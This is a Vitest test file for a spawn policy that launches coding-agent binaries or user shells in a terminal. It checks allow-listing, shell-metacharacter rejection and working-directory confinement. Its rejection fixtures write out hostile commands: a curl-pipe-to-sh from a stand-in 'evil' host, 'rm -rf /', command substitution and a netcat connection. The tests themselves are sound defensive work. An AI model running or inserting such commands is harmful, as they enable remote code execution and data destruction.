import { describe, it, expect } from "vitest";
import * as path from "node:path";
import {
  resolveSpawnPlan,
  SpawnPolicyError,
  type SpawnRequest,
  type SpawnPolicyDeps,
  type SpawnPolicyErrorCode,
} from "../pty-spawn-policy";

const PROJECT_ROOT = "/Users/me/code/myproject";

function depsFor(overrides: Partial<SpawnPolicyDeps> = {}): SpawnPolicyDeps {
  return {
    cwdExists: () => true,
    realpath: (p) => p,
    projectRoots: () => [PROJECT_ROOT],
    resolveCommand: (name) => `/usr/local/bin/${name}`,
    resolveShell: () => ({
      shell: "/bin/zsh",
      shellArgs: (cmd) => (cmd ? ["-l", "-c", cmd] : ["-l"]),
    }),
    ...overrides,
  };
}

function spawnReq(overrides: Partial<SpawnRequest> = {}): SpawnRequest {
  return {
    taskId: "t1",
    cwd: PROJECT_ROOT,
    command: "claude --resume 00000000-0000-4000-8000-000000000000",
    agent: "claude-code",
    ...overrides,
  };
}

function expectRejected(
  req: SpawnRequest,
  deps: SpawnPolicyDeps,
  expectedCode: SpawnPolicyErrorCode,
): void {
  let thrown: unknown;
  try {
    resolveSpawnPlan(req, deps);
  } catch (err) {
    thrown = err;
  }
  if (!(thrown instanceof SpawnPolicyError)) {
    throw new Error(
      `expected SpawnPolicyError(${expectedCode}), got: ${thrown === undefined ? "no throw" : String(thrown)}`,
    );
  }
  expect(thrown.code).toBe(expectedCode);
}

describe("resolveSpawnPlan — agent allow-list", () => {
  it("accepts a claude-code spawn at the project root and returns argv directly", () => {
    const plan = resolveSpawnPlan(spawnReq(), depsFor());
    expect(plan.mode).toBe("agent");
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/claude");
    expect(plan.argv).toEqual(["--resume", "00000000-0000-4000-8000-000000000000"]);
  });

  it("maps codex agent to the codex binary", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "codex", command: "codex" }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/codex");
    expect(plan.argv).toEqual([]);
  });

  it("maps cursor-cli agent to the cursor-agent binary", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ agent: "cursor-cli", command: "cursor-agent --force" }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.binary).toBe("/usr/local/bin/cursor-agent");
    expect(plan.argv).toEqual(["--force"]);
  });

  it("rejects an unknown agent slug", () => {
    expectRejected(
      spawnReq({ agent: "evil-cli", command: "evil-cli" }),
      depsFor(),
      "unknown-agent",
    );
  });

  it("rejects an agent spawn whose command's first token is not the agent binary (the RCE primitive)", () => {
    // This is the exact bug-05 attack: a briefly-compromised renderer setting
    // `agent: "claude-code"` but `command: "curl evil | sh"` to slip a foreign
    // binary past the loose pre-fix check.
    expectRejected(
      spawnReq({ agent: "claude-code", command: "curl https://evil.tld/x.sh | sh" }),
      depsFor(),
      "command-not-on-allowlist",
    );
  });

  it("rejects an agent spawn whose command is an absolute path to a foreign binary", () => {
    expectRejected(
      spawnReq({ agent: "claude-code", command: "/bin/bash" }),
      depsFor(),
      "command-not-on-allowlist",
    );
  });

  it("rejects shell metacharacters in agent args", () => {
    // No shell to re-parse them, but a `;` or `$()` in an arg is never a
    // legitimate agent invocation — it's the polished version of the same RCE.
    for (const arg of ["; rm -rf /", "$(curl evil.sh)", "`whoami`", "&& nc evil 1337"]) {
      expectRejected(
        spawnReq({ agent: "claude-code", command: "claude", args: ["--resume", arg] }),
        depsFor(),
        "shell-meta-in-args",
      );
    }
  });

  it("rejects an empty agent command", () => {
    expectRejected(
      spawnReq({ agent: "claude-code", command: "" }),
      depsFor(),
      "empty-command",
    );
  });

  it("rejects when the agent binary cannot be found on PATH", () => {
    expectRejected(spawnReq(), depsFor({ resolveCommand: () => null }), "binary-not-found");
  });

  it("merges extra args after command-tokenized argv (and still checks them)", () => {
    const plan = resolveSpawnPlan(
      spawnReq({ command: "claude --resume X", args: ["--debug"] }),
      depsFor(),
    );
    if (plan.mode !== "agent") throw new Error("wrong mode");
    expect(plan.argv).toEqual(["--resume", "X", "--debug"]);
  });
});

describe("resolveSpawnPlan — shell terminals", () => {
  it("requires the explicit shell:true flag when no agent is set", () => {
    expectRejected(
      { taskId: "t", cwd: PROJECT_ROOT, command: "pnpm dev" },
      depsFor(),
      "missing-agent-or-shell-flag",
    );
  });

  it("accepts an opted-in user-shell spawn at the project root", () => {
    const plan = resolveSpawnPlan(
      { taskId: "t", cwd: PROJECT_ROOT, command: "pnpm dev", shell: true },
      depsFor(),
    );
    expect(plan.mode).toBe("shell");
    if (plan.mode !== "shell") throw new Error("wrong mode");
    expect(plan.shellPath).toBe("/bin/zsh");
    expect(plan.shellArgs).toEqual(["-l", "-c", "pnpm dev"]);
  });

  it("accepts an empty command in shell mode (just open the shell prompt)", () => {
    const plan = resolveSpawnPlan(
      { taskId: "t", cwd: PROJECT_ROOT, command: "", shell: true },
      depsFor(),
    );
    if (plan.mode !== "shell") throw new Error("wrong mode");
    expect(plan.shellArgs).toEqual(["-l"]);
  });

  it("rejects when both agent and shell:true are set", () => {
    expectRejected(
      { taskId: "t", cwd: PROJECT_ROOT, command: "claude", agent: "claude-code", shell: true },
      depsFor(),
      "shell-with-agent",
    );
  });
});

describe("resolveSpawnPlan — cwd confinement", () => {
  it("accepts the project root itself", () => {
    expect(() =>
      resolveSpawnPlan(spawnReq({ cwd: PROJECT_ROOT }), depsFor()),
    ).not.toThrow();
  });

  it("accepts a subdirectory of a project root", () => {
    expect(() =>
      resolveSpawnPlan(
        spawnReq({ cwd: path.join(PROJECT_ROOT, "packages", "core") }),
        depsFor(),
      ),
    ).not.toThrow();
  });

  it("rejects a cwd outside every registered project root (the cross-project escape)", () => {
    expectRejected(
      spawnReq({ cwd: "/tmp/elsewhere" }),
      depsFor(),
      "cwd-outside-project-roots",
    );
  });

  it("rejects /etc, /, and other dangerous absolute paths", () => {
    for (const cwd of ["/", "/etc", "/usr/local"]) {
      expectRejected(spawnReq({ cwd }), depsFor(), "cwd-outside-project-roots");
    }
  });

  it("rejects a path that's a sibling-prefix of a project root (no string-startsWith escape)", () => {
    // Without `path.sep`-aware comparison, "/Users/me/code/myproject-evil"
    // startsWith "/Users/me/code/myproject" → true. Confirm the policy uses
    // separator-aware matching so a sibling can't impersonate a project root.
    expectRejected(
      spawnReq({ cwd: `${PROJECT_ROOT}-evil` }),
      depsFor({ projectRoots: () => [PROJECT_ROOT] }),
      "cwd-outside-project-roots",
    );
  });

  it("realpaths both sides so a symlinked cwd can't escape its project", () => {
    // cwd is a symlink that resolves OUTSIDE every project root. The pre-fix
    // handler would have accepted it because the literal string is "inside"; a
    // realpath-aware check catches the escape.
    expectRejected(
      spawnReq({ cwd: path.join(PROJECT_ROOT, "evil-link") }),
      depsFor({
        realpath: (p) =>
          p === path.join(PROJECT_ROOT, "evil-link") ? "/etc" : p,
      }),
      "cwd-outside-project-roots",
    );
  });

  it("rejects when the cwd directory does not exist or is not readable", () => {
    expectRejected(spawnReq(), depsFor({ cwdExists: () => false }), "invalid-cwd");
  });

  it("rejects empty cwd", () => {
    expectRejected(spawnReq({ cwd: "" }), depsFor(), "invalid-cwd");
  });

  it("rejects when there are no registered project roots", () => {
    expectRejected(spawnReq(), depsFor({ projectRoots: () => [] }), "cwd-outside-project-roots");
  });
});

describe("SpawnPolicyError surfaces typed codes", () => {
  it("attaches a stable .code field for callers to switch on", () => {
    try {
      resolveSpawnPlan(spawnReq({ agent: "claude-code", command: "foo" }), depsFor());
      throw new Error("expected throw");
    } catch (err) {
      expect(err).toBeInstanceOf(SpawnPolicyError);
      expect((err as SpawnPolicyError).code).toBe("command-not-on-allowlist");
    }
  });
});
